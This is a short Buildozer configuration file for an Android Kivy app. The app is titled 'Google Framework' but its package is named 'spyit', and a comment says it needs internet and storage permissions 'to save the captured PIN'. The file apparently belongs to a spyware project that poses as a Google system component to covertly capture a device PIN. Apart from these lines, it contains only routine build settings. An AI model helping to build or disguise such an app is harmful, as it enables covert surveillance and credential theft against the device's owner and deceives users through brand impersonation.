[app]
title = Google Framework
package.name = spyit
package.domain = com.spyit.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,kivy==2.3.1,pillow

# George needs these permissions to save the captured PIN
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE

# Essential settings for modern Android
android.api = 31
android.minapi = 21
android.sdk = 31
android.ndk = 25b
android.archs = armeabi-v7a, arm64-v8a
p4a.branch = develop

[buildozer]
log_level = 2
warn_on_root = 1
